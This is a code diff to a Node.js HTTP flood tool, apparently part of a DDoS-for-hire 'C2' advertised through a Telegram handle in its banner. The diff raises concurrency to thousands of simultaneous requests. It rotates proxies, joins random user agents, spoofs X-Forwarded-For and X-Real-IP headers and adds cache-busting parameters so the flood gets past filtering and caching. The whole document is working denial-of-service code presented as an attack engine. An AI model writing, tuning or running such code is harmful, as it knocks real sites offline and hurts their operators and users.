@@ -3,10 +3,13 @@ const fs = require('fs');
 const os = require('os');
 const http = require('http');
 const https = require('https');
+const process = require('process');
 
-const MAX_CONCURRENT = Math.min(os.cpus().length * 154, 1540); // adjust if needed
+// Constants
+const MAX_CONCURRENT = Math.min(os.cpus().length * 154, 7540); // adjust if needed
 const REQUEST_TIMEOUT = 8000;
 
+// Load Files
 function loadLines(filename) {
     try {
         return fs.readFileSync(filename, 'utf8')
@@ -18,32 +21,34 @@ function loadLines(filename) {
     }
 }
 
-const USER_AGENTS = loadLines('ua.txt');
-const PROXIES = loadLines('proxy.txt');
-const REFERERS = loadLines('refs.txt');
+const USER_AGENTS = loadLines('ua.txt');  // Two per request
+const PROXIES = loadLines('proxy.txt');   // One proxy per request
+const REFERERS = loadLines('refs.txt');   // For referrer
 
-const UA_POOL = Array.from({ length: 10000 }, () => 
-    [USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)], 
-     USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]]
-);
-
+// Keep-alive agents
 const keepAliveHttp = new http.Agent({ keepAlive: true });
 const keepAliveHttps = new https.Agent({ keepAlive: true });
 
+// Attack Engine
 class AttackEngine {
     constructor(target, duration) {
         this.target = target;
         this.duration = duration * 1000;
         this.startTime = Date.now();
-        this.stats = { total: 0, success: 0, errors: 0, peakRps: 0 };
-        this.uaIndex = 0;
-        this.proxyIndex = 0;
+        this.stats = {
+            total: 0,
+            success: 0,
+            errors: 0,
+            peakRps: 0
+        };
         this.running = true;
     }
 
     getRandomUA() {
-        this.uaIndex = (this.uaIndex + 1) % UA_POOL.length;
-        return UA_POOL[this.uaIndex];
+        // Return two random User-Agents for each request
+        const ua1 = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0';
+        const ua2 = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0';
+        return [ua1, ua2];
     }
 
     getRandomReferer() {
@@ -51,14 +56,14 @@ class AttackEngine {
     }
 
     getRandomProxy() {
-        this.proxyIndex = (this.proxyIndex + 1) % PROXIES.length;
-        return PROXIES[this.proxyIndex];
+        const proxy = PROXIES[Math.floor(Math.random() * PROXIES.length)] || '';
+        return `http://${proxy}`;
     }
 
     async makeRequest() {
         const randomIP = Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
         const headers = {
-            'User-Agent': this.getRandomUA().join(' '), // Two user agents
+            'User-Agent': this.getRandomUA().join(', '),  // Use two User-Agents per request
             'Referer': this.getRandomReferer(),
             'X-Forwarded-For': randomIP,
             'X-Real-IP': randomIP,
@@ -71,16 +76,20 @@ class AttackEngine {
             'Upgrade-Insecure-Requests': '1'
         };
 
-        const proxy = this.getRandomProxy();
         const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;
 
         try {
+            const proxy = this.getRandomProxy();
+            const isHttps = this.target.startsWith('https');
             const response = await axios.get(urlWithNoise, {
                 headers,
                 timeout: REQUEST_TIMEOUT,
                 httpAgent: keepAliveHttp,
                 httpsAgent: keepAliveHttps,
-                proxy: { host: proxy.split(':')[0], port: proxy.split(':')[1] },
+                proxy: {
+                    host: proxy.split(':')[0],
+                    port: proxy.split(':')[1]
+                },
                 validateStatus: null
             });
             if (response.status === 200) {
@@ -88,7 +97,7 @@ class AttackEngine {
                 return;
             }
         } catch {
-            this.stats.errors++;
+            // ignored
         }
 
         this.stats.errors++;
@@ -110,6 +119,18 @@ class AttackEngine {
     }
 
     async runAttack() {
+        const showIntro = () => {
+            console.clear();
+            console.log('\n  SNOWYC2 - T.ME/STSVKINGDOM');
+            console.log('  ============================================');
+            console.log(`  TARGET: ${this.target}`);
+            console.log(`  TIME:   ${this.duration / 1000}s`);
+            console.log(`  MODE:   RAPID STRIKE - ${MAX_CONCURRENT} Concurrent`);
+            console.log('  ============================================\n');
+        };
+
+        showIntro();
+
         let lastTotal = 0;
         const printStats = setInterval(() => {
             const elapsed = (Date.now() - this.startTime) / 1000;
@@ -143,7 +164,7 @@ class AttackEngine {
     }
 }
 
-// Main
+// Main Execution
 (async () => {
     const readline = require('readline').createInterface({
         input: process.stdin,
